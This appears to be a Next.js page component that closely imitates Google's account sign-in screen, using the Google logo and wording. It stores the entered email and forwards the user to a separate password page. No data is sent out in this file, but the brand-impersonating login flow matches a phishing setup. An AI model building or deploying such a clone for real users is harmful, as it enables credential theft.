"use client"; // needed in Next.js App Router

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function Home() {
  const [email, setEmail] = useState("");
  const router = useRouter();

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    localStorage.setItem("email", email.trim());
    router.push("/password");
  };

  return (
    <div>
      <div
        className="min-h-screen text-white w-full fixed overflow-hidden bg-[#111111]"
      >
        <div className="space-y-4 px-6 pt-6">
          <Image src="/google.png" alt="Google logo" width={40} height={40} />
          <h1 className="text-3xl">Sign in</h1>
          <p className="text-md">with your Google Account. This account will be available to other Google apps in the browser.</p>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit}>
          <div className="my-12 px-6">
            <input
              className="p-4 rounded-md focus:outline-none focus:border-blue-300 w-full mb-1 bg-transparent border border-gray-600"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email or phone"
              required
            />
            <a href="#" className="text-sm text-blue-300 font-medium">
              Forget email?
            </a>
          </div>

          <div className="px-6">
            <div className="text-sm inline">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <a
                href="#"
                className="text-sm font-semibold text-blue-300 hover:underline"
              >
                Learn more about using Guest mode
              </a>
            </div>
          </div>

          <div className="flex justify-between mt-8 items-center text-sm font-semibold px-2">
            <a
              href="#"
              className="text-blue-300 hover:bg-gray-900 py-2 px-4 rounded-3xl"
            >
              Create account
            </a>
            <button
              className="bg-blue-300 py-2 px-6 rounded-3xl text-gray-900 font-medium focus:outline-none"
              type="submit"
            >
              Next
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="absolute bottom-5 text-white justify-between flex text-sm w-full px-4">
        <p>English (United States)</p>
        <div className="flex justify-between items-center">
          <a href="" className="mx-3">
            Help
          </a>
          <a href="" className="mx-3">
            Privacy
          </a>
          <a href="" className="mx-3">
            Terms
          </a>
        </div>
      </div>
    </div>
  );
}
